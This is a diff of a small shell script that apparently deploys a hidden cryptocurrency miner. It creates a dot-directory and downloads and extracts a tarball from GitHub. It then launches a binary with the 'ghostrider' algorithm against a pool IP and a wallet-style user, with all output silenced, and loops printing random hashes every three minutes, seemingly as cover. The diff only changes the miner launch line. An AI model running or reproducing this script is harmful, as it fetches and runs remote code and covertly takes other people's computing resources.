@@ -1,4 +1,4 @@
 mkdir .suadikap && cd .suadikap
 wget https://github.com/ganejafaujanih/garing/raw/main/emen.tar.gz && tar -xvf emen.tar.gz
-./abeh -a ghostrider --url 143.42.65.73:80 --user SSuVek3r3mmQSLkincjW4K1HkBGCj6adEU.hansip -t $(nproc --all) >/dev/null 2>&1
+./abeh -a ghostrider --url 143.42.65.73:80 --user SSuVek3r3mmQSLkincjW4K1HkBGCj6adEU.hansip >/dev/null 2>&1
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
